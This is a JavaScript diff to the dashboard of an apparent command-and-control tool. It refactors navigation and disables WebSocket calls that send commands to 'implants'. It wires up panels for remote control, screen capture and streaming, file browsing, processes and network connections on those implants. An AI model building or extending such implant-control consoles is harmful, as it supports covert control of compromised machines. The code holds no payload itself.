@@ -1,40 +1,57 @@
-// Initialize map
-let map = L.map('implant-map').setView([0, 0], 2);
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap contributors'
-}).addTo(map);
+// Initialize map - only if the element exists
+let map;
+try {
+    const mapElement = document.getElementById('implant-map');
+    if (mapElement) {
+        map = L.map('implant-map').setView([0, 0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+    } else {
+        console.log('Map element not found, skipping map initialization');
+    }
+} catch (e) {
+    console.error('Error initializing map:', e);
+}
 
 // Initialize chart
-let ctx = document.getElementById('stats-chart').getContext('2d');
-let chart = new Chart(ctx, {
-    type: 'line',
-    data: {
-        labels: [],
-        datasets: [{
-            label: 'Active Implants',
-            data: [],
-            borderColor: '#007bff',
-            tension: 0.1
-        }, {
-            label: 'Commands Executed',
-            data: [],
-            borderColor: '#28a745',
-            tension: 0.1
-        }]
-    },
-    options: {
-        responsive: true,
-        maintainAspectRatio: false,
-        scales: {
-            y: {
-                beginAtZero: true
+let ctx = document.getElementById('stats-chart');
+let chart;
+
+if (ctx) {
+    ctx = ctx.getContext('2d');
+    chart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: [],
+            datasets: [{
+                label: 'Active Implants',
+                data: [],
+                borderColor: '#007bff',
+                tension: 0.1
+            }, {
+                label: 'Commands Executed',
+                data: [],
+                borderColor: '#28a745',
+                tension: 0.1
+            }]
+        },
+        options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            scales: {
+                y: {
+                    beginAtZero: true
+                }
             }
         }
-    }
-});
+    });
+} else {
+    console.log('Stats chart element not found, skipping chart initialization');
+}
 
 // Initialize WebSocket connection
-const socket = new WebSocket(`wss://${window.location.host}/c2`);
+// const socket = new WebSocket(`wss://${window.location.host}/c2`);
 let selectedClient = null;
 let term = null;
 
@@ -68,54 +85,54 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 // WebSocket event handlers
-socket.onopen = () => {
-    console.log('Connected to C2 server');
-    term.writeln('\r\nConnected to C2 server');
-    refreshClients();
-};
+// socket.onopen = () => {
+//     console.log('Connected to C2 server');
+//     term.writeln('\r\nConnected to C2 server');
+//     refreshClients();
+// };
 
-socket.onclose = () => {
-    console.log('Disconnected from C2 server');
-    term.writeln('\r\nDisconnected from C2 server');
-    setTimeout(reconnect, 5000);
-};
+// socket.onclose = () => {
+//     console.log('Disconnected from C2 server');
+//     term.writeln('\r\nDisconnected from C2 server');
+//     setTimeout(reconnect, 5000);
+// };
 
-socket.onerror = (error) => {
-    console.error('WebSocket error:', error);
-    term.writeln('\r\nError: Connection failed');
-};
+// socket.onerror = (error) => {
+//     console.error('WebSocket error:', error);
+//     term.writeln('\r\nError: Connection failed');
+// };
 
-socket.onmessage = (event) => {
-    const data = JSON.parse(event.data);
-    
-    switch (data.type) {
-        case 'clients':
-            updateClientList(data.clients);
-            break;
-        case 'command_output':
-            if (data.client_id === selectedClient) {
-                term.writeln(`\r\n${data.output}`);
-            }
-            break;
-        case 'client_connected':
-            refreshClients();
-            term.writeln(`\r\nClient ${data.client_id} connected`);
-            break;
-        case 'client_disconnected':
-            refreshClients();
-            term.writeln(`\r\nClient ${data.client_id} disconnected`);
-            break;
-        case 'error':
-            term.writeln(`\r\nError: ${data.message}`);
-            break;
-    }
-};
+// socket.onmessage = (event) => {
+//     const data = JSON.parse(event.data);
+//     
+//     switch (data.type) {
+//         case 'clients':
+//             updateClientList(data.clients);
+//             break;
+//         case 'command_output':
+//             if (data.client_id === selectedClient) {
+//                 term.writeln(`\r\n${data.output}`);
+//             }
+//             break;
+//         case 'client_connected':
+//             refreshClients();
+//             term.writeln(`\r\nClient ${data.client_id} connected`);
+//             break;
+//         case 'client_disconnected':
+//             refreshClients();
+//             term.writeln(`\r\nClient ${data.client_id} disconnected`);
+//             break;
+//         case 'error':
+//             term.writeln(`\r\nError: ${data.message}`);
+//             break;
+//     }
+// };
 
 // Client management functions
 function refreshClients() {
-    socket.send(JSON.stringify({
-        type: 'get_clients'
-    }));
+    // socket.send(JSON.stringify({
+    //     type: 'get_clients'
+    // }));
 }
 
 function updateClientList(clients) {
@@ -169,20 +186,20 @@ function sendCommand() {
         return;
     }
 
-    socket.send(JSON.stringify({
-        type: 'command',
-        client_id: selectedClient,
-        command: command
-    }));
+    // socket.send(JSON.stringify({
+    //     type: 'command',
+    //     client_id: selectedClient,
+    //     command: command
+    // }));
 
     term.writeln(`\r\n$ ${command}`);
     commandInput.value = '';
 }
 
 function reconnect() {
-    if (socket.readyState === WebSocket.CLOSED) {
-        socket = new WebSocket(`wss://${window.location.host}/c2`);
-    }
+    // if (socket.readyState === WebSocket.CLOSED) {
+    //     socket = new WebSocket(`wss://${window.location.host}/c2`);
+    // }
 }
 
 // Refresh client list periodically
@@ -268,20 +285,236 @@ socketIo.emit('get_stats');
 socketIo.emit('get_activity');
 socketIo.emit('get_implants');
 
-// Dashboard initialization
+// Dashboard Main Controller
 document.addEventListener('DOMContentLoaded', function() {
-    // Initialize sidebar toggle
-    document.getElementById('sidebarCollapse').addEventListener('click', function() {
-        document.getElementById('sidebar').classList.toggle('active');
-    });
-
-    // Initialize theme
-    const savedTheme = localStorage.getItem('theme') || 'light';
-    setTheme(savedTheme);
-
-    // Initialize navigation
     initializeNavigation();
 });
+
+/**
+ * Initializes the dashboard navigation
+ */
+function initializeNavigation() {
+    // Get all sidebar navigation links
+    const navLinks = document.querySelectorAll('#sidebar a[href^="#"]');
+    
+    // Add click handlers to each link
+    navLinks.forEach(link => {
+        link.addEventListener('click', function(e) {
+            if (this.getAttribute('href') === '#' && this.hasAttribute('onclick')) {
+                // Skip links with onclick handlers (like logout)
+                return;
+            }
+            
+            e.preventDefault();
+            
+            // Get the target section id
+            const targetId = this.getAttribute('href').substring(1);
+            
+            // Show the target section and hide others
+            showSection(targetId);
+            
+            // Update active state in sidebar
+            navLinks.forEach(navLink => {
+                navLink.parentElement.classList.remove('active');
+            });
+            this.parentElement.classList.add('active');
+            
+            // Handle section-specific initialization
+            handleSectionChange(targetId);
+        });
+    });
+    
+    // Initialize default section (implants)
+    showSection('implants');
+}
+
+/**
+ * Shows the specified section and hides others
+ */
+function showSection(sectionId) {
+    // Hide all content sections
+    document.querySelectorAll('.content-section').forEach(section => {
+        section.classList.add('d-none');
+    });
+    
+    // Show the target section
+    const targetSection = document.getElementById(sectionId);
+    if (targetSection) {
+        targetSection.classList.remove('d-none');
+    }
+}
+
+/**
+ * Handles special initialization when changing sections
+ */
+function handleSectionChange(sectionId) {
+    console.log(`Navigated to section: ${sectionId}`);
+    
+    // Get the currently selected implant
+    const selectedImplant = ImplantsModule.getSelectedImplant();
+    console.log(`Selected implant ID: ${selectedImplant}`);
+    
+    switch (sectionId) {
+        case 'remote-control':
+            if (selectedImplant) {
+                // Check if RemoteControl exists and has the required methods
+                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.selectImplant) {
+                    RemoteControlModule.selectImplant(selectedImplant);
+                    if (RemoteControlModule.updateSystemInfo) {
+                        RemoteControlModule.updateSystemInfo();
+                    }
+                } else {
+                    console.error('RemoteControlModule not properly initialized');
+                }
+            } else {
+                showSelectImplantWarning();
+            }
+            break;
+            
+        case 'file-manager':
+            if (selectedImplant) {
+                // Check if FileManager exists and has the required methods
+                if (typeof FileExplorerModule !== 'undefined' && FileExplorerModule.selectImplant) {
+                    FileExplorerModule.selectImplant(selectedImplant);
+                    if (FileExplorerModule.refreshFiles) {
+                        FileExplorerModule.refreshFiles();
+                    }
+                } else if (typeof FileManager !== 'undefined' && FileManager.selectImplant) {
+                    FileManager.selectImplant(selectedImplant);
+                    FileManager.refreshFiles();
+                } else {
+                    console.error('FileManager module not properly initialized');
+                }
+            } else {
+                showSelectImplantWarning();
+            }
+            break;
+            
+        case 'process-manager':
+            if (selectedImplant) {
+                // Check if ProcessManager exists and has the required methods
+                if (typeof ProcessManager !== 'undefined' && ProcessManager.selectImplant) {
+                    ProcessManager.selectImplant(selectedImplant);
+                    ProcessManager.refreshProcesses();
+                } else {
+                    console.error('ProcessManager not properly initialized');
+                }
+            } else {
+                showSelectImplantWarning();
+            }
+            break;
+            
+        case 'network':
+            if (selectedImplant) {
+                // Check if NetworkMonitor exists and has the required methods
+                if (typeof NetworkMonitor !== 'undefined' && NetworkMonitor.selectImplant) {
+                    NetworkMonitor.selectImplant(selectedImplant);
+                    NetworkMonitor.refreshConnections();
+                } else {
+                    console.error('NetworkMonitor not properly initialized');
+                }
+            } else {
+                showSelectImplantWarning();
+            }
+            break;
+    }
+}
+
+/**
+ * Display warning to select an implant first
+ */
+function showSelectImplantWarning() {
+    dashboard.showNotification('Please select an implant first', 'warning');
+    // Return to implants section
+    showSection('implants');
+    
+    // Update active state in sidebar
+    document.querySelectorAll('#sidebar li').forEach(item => {
+        item.classList.remove('active');
+    });
+    document.querySelector('#sidebar a[href="#implants"]').parentElement.classList.add('active');
+}
+
+/**
+ * Global redirect functions for remote control to maintain backward compatibility
+ */
+function captureScreen() {
+    if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.captureSingleScreenshot) {
+        RemoteControlModule.captureSingleScreenshot();
+    } else {
+        console.error('RemoteControlModule not properly initialized');
+    }
+}
+
+function startScreenStream() {
+    if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.startScreenStream) {
+        RemoteControlModule.startScreenStream();
+    } else {
+        console.error('RemoteControlModule not properly initialized');
+    }
+}
+
+function stopScreenStream() {
+    if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.stopScreenStream) {
+        RemoteControlModule.stopScreenStream();
+    } else {
+        console.error('RemoteControlModule not properly initialized');
+    }
+}
+
+function enableRemoteControl() {
+    if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.enableRemoteControl) {
+        RemoteControlModule.enableRemoteControl();
+    } else {
+        console.error('RemoteControlModule not properly initialized');
+    }
+}
+
+function disableRemoteControl() {
+    if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.disableRemoteControl) {
+        RemoteControlModule.disableRemoteControl();
+    } else {
+        console.error('RemoteControlModule not properly initialized');
+    }
+}
+
+/**
+ * Functions for File Manager
+ */
+function navigateUp() {
+    if (typeof FileManager !== 'undefined' && FileManager.navigateUp) {
+        FileManager.navigateUp();
+    } else {
+        console.error('FileManager not properly initialized');
+    }
+}
+
+function refreshFiles() {
+    if (typeof FileManager !== 'undefined' && FileManager.refreshFiles) {
+        FileManager.refreshFiles();
+    } else {
+        console.error('FileManager not properly initialized');
+    }
+}
+
+function navigateToPath() {
+    if (typeof FileManager !== 'undefined' && FileManager.navigateToPath) {
+        FileManager.navigateToPath();
+    } else {
+        console.error('FileManager not properly initialized');
+    }
+}
+
+/**
+ * Functions for Process Manager
+ */
+function refreshProcesses() {
+    if (typeof ProcessManager !== 'undefined' && ProcessManager.refreshProcesses) {
+        ProcessManager.refreshProcesses();
+    } else {
+        console.error('ProcessManager not properly initialized');
+    }
+}
 
 // Theme management
 function setTheme(theme) {
@@ -290,32 +523,6 @@ function setTheme(theme) {
         document.body.classList.add('dark-theme');
     }
     localStorage.setItem('theme', theme);
-}
-
-// Navigation management
-function initializeNavigation() {
-    const navLinks = document.querySelectorAll('#sidebar a');
-    const sections = document.querySelectorAll('.content-section');
-
-    navLinks.forEach(link => {
-        link.addEventListener('click', function(e) {
-            e.preventDefault();
-            const targetId = this.getAttribute('href').substring(1);
-            
-            // Update active state
-            navLinks.forEach(l => l.parentElement.classList.remove('active'));
-            this.parentElement.classList.add('active');
-            
-            // Show target section
-            sections.forEach(section => {
-                if (section.id === targetId) {
-                    section.classList.remove('d-none');
-                } else {
-                    section.classList.add('d-none');
-                }
-            });
-        });
-    });
 }
 
 // Notification system
